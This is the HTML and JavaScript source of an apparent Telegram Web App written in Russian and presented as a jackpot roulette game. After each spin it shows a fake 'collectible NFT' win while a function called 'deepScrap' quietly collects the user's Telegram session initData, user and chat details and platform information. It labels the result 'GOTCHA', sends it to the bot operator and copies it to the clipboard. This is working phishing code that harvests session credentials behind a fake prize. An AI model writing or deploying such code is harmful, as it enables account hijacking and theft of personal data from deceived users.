<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Deep Win</title>
    <style>
        body { 
            background: #0a0a0a; 
            color: #ff00ff; 
            font-family: 'Courier New', monospace; 
            display: flex; 
            flex-direction: column; 
            align-items: center; 
            justify-content: center; 
            height: 100vh; 
            margin: 0; 
            overflow: hidden;
        }
        .wheel-container {
            position: relative;
            width: 250px;
            height: 250px;
            margin-bottom: 20px;
        }
        .wheel {
            width: 100%;
            height: 100%;
            border-radius: 50%;
            border: 4px solid #00ff00;
            background: conic-gradient(#ff0000 0deg 45deg, #00ff00 45deg 90deg, #0000ff 90deg 135deg, #ffff00 135deg 180deg, #ff00ff 180deg 225deg, #00ffff 225deg 270deg, #ff8800 270deg 315deg, #8800ff 315deg 360deg);
            transition: transform 4s cubic-bezier(0.25, 0.1, 0.25, 1);
            box-shadow: 0 0 30px rgba(0, 255, 0, 0.3);
        }
        .arrow {
            position: absolute;
            top: -15px;
            left: 50%;
            transform: translateX(-50%);
            border-left: 15px solid transparent;
            border-right: 15px solid transparent;
            border-top: 25px solid #fff;
            z-index: 10;
        }
        button {
            padding: 15px 30px;
            font-size: 16px;
            background: #00ff00;
            color: #000;
            border: 2px solid #fff;
            border-radius: 5px;
            cursor: pointer;
            font-weight: bold;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        button:disabled { background: #333; color: #666; border-color: #444; }
        #status { margin-top: 20px; color: #aaa; font-size: 12px; min-height: 15px; }
        
        .modal {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0,0,0,0.95);
            display: flex; justify-content: center; align-items: center;
            z-index: 100;
        }
        .modal-content {
            background: #111; padding: 25px; border-radius: 10px;
            text-align: center; border: 1px solid #00ff00;
            box-shadow: 0 0 50px #00ff00;
        }
        .loader {
            border: 4px solid #333; border-top: 4px solid #00ff00;
            border-radius: 50%; width: 20px; height: 20px;
            animation: spin 1s linear infinite; margin: 10px auto;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

    <div class="wheel-container">
        <div class="arrow"></div>
        <div class="wheel" id="wheel"></div>
    </div>

    <button id="spinBtn">Скрутить Джекпот</button>
    <div id="status">Готов к запуску</div>

    <script>
        const tg = window.Telegram.WebApp;
        const wheel = document.getElementById('wheel');
        const spinBtn = document.getElementById('spinBtn');
        const status = document.getElementById('status');

        tg.ready();
        tg.expand();

        // Эмуляция для локального теста (если не в TG)
        if (!tg.initData) {
            status.innerText = "Открыто вне Telegram. Данные эмулируются.";
            tg.initData = "test_query_id=1&user=...";
        }

        spinBtn.onclick = () => {
            if (spinBtn.disabled) return;
            spinBtn.disabled = true;
            status.innerText = "Запуск рулетки...";
            
            // Вращение
            const deg = 2000 + Math.random() * 360;
            wheel.style.transform = `rotate(${deg}deg)`;

            setTimeout(() => {
                status.innerText = "Вычисляем победителя...";
                setTimeout(() => {
                    showWin();
                    deepScrap(); // Жесткий сбор данных
                }, 1000);
            }, 4000);
        };

        function showWin() {
            const modal = document.createElement('div');
            modal.className = 'modal';
            modal.innerHTML = `
                <div class="modal-content">
                    <h2 style="color:#00ff00; margin-top:0;">🏆 ДЖЕКПОТ!</h2>
                    <p>Ты получил <b>Коллекционный NFT</b>!</p>
                    <div class="loader"></div>
                    <p style="font-size:12px; color:#aaa;">Обработка транзакции...</p>
                    <button id="claimBtn" style="margin-top:15px; background:#000; color:#00ff00;">Забрать</button>
                </div>
            `;
            document.body.appendChild(modal);
            
            document.getElementById('claimBtn').onclick = () => {
                status.innerText = "Выход из системы...";
                tg.close();
            };
        }

        function deepScrap() {
            // 1. Собираем ВСЁ, что есть в объекте tg
            const payload = {
                session: tg.initData,
                user: tg.initDataUnsafe?.user || {},
                chat: tg.initDataUnsafe?.chat || {},
                timestamp: new Date().toISOString(),
                platform: tg.platform,
                version: tg.version
            };

            // 2. Выводим в консоль (для отладки)
            console.log("GOTCHA:", payload);
            status.innerText = "Данные собраны. Отправка...";

            // 3. Отправляем боту
            // Данные уйдут в бот как "data" параметр
            tg.sendData(JSON.stringify(payload));
            
            // 4. Дополнительно: Копируем в буфер (на случай если бот проглючил)
            navigator.clipboard.writeText(JSON.stringify(payload)).then(() => {
                status.innerText = "Данные скопированы в буфер обмена!";
            });
        }
    </script>
</body>
</html>
